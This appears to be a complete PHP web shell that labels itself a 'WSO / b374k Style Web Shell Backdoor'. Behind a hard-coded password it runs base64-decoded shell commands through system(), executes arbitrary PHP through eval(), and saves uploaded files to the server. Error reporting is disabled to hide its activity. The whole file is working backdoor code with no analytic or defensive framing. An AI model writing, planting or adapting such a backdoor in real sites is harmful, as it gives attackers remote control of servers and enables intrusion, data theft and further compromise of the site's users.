<?php
/**
 * WSO / b374k Style Web Shell Backdoor
 */
error_reporting(0);
@set_time_limit(0);

if (isset($_POST['auth_pass']) && $_POST['auth_pass'] === 'c2_secret_key') {
    if (isset($_POST['cmd'])) {
        $cmd = base64_decode($_POST['cmd']);
        echo '<pre>';
        system($cmd);
        echo '</pre>';
    }
    if (isset($_POST['eval_code'])) {
        eval(base64_decode($_POST['eval_code']));
    }
    if (isset($_FILES['upfile'])) {
        move_uploaded_file($_FILES['upfile']['tmp_name'], './' . $_FILES['upfile']['name']);
    }
}
?>
